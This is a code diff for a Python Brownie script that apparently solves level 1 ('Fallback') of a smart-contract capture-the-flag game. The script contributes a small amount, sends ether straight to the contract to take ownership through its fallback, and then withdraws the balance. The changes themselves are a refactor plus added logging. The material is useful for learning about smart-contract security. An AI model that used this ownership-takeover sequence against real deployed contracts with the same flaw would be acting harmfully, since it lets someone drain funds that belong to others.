@@ -1,33 +1,34 @@
 from brownie import Fallback, Contract
 
-from scripts.helpful_scripts import get_account, get_new_instance, submit_instance
+from scripts.helpful_scripts import (
+    get_account,
+    get_level_contract,
+    submit_instance,
+    print_out_if_level_solved,
+)
 
 LEVEL_NAME = "01_fallback"
 INTERFACE_CONTRACT = Fallback
 
 
-def get_level_contract():
-    instance_address = get_new_instance(LEVEL_NAME)
-    level_contract = Contract.from_abi(
-        INTERFACE_CONTRACT._name, instance_address, INTERFACE_CONTRACT.abi
-    )
-    return level_contract
-
-
 def solve_level(level_contract):
     account = get_account()
-    level_contract.contribute({"amount": 1, "from": account})
-    account.transfer(level_contract, "1 wei")
-    level_contract.withdraw({"from": account})
+    print(f"Strated to solve {LEVEL_NAME}")
+    tx = level_contract.contribute({"amount": 1, "from": account})
+    tx.wait(1)
+    print("Contribute is done")
+    tx = account.transfer(level_contract, "1 wei")
+    tx.wait(1)
+    print("Transfer is done")
+    tx = level_contract.withdraw({"from": account})
+    tx.wait(1)
+    print("Withdraw is done")
 
 
 # brownie run scripts/_01_fallback.py --network rinkeby-fork
 def main():
-    level_contract = get_level_contract()
+    level_contract = get_level_contract(LEVEL_NAME, INTERFACE_CONTRACT)
     solve_level(level_contract)
     level_solved = submit_instance(level_contract.address)
-    if level_solved:
-        print("You have completed level -> " + LEVEL_NAME)
-    else:
-        print(f"Looks like you haven't cracked level {LEVEL_NAME} just yet!")
+    print_out_if_level_solved(level_solved, LEVEL_NAME)
     return level_solved
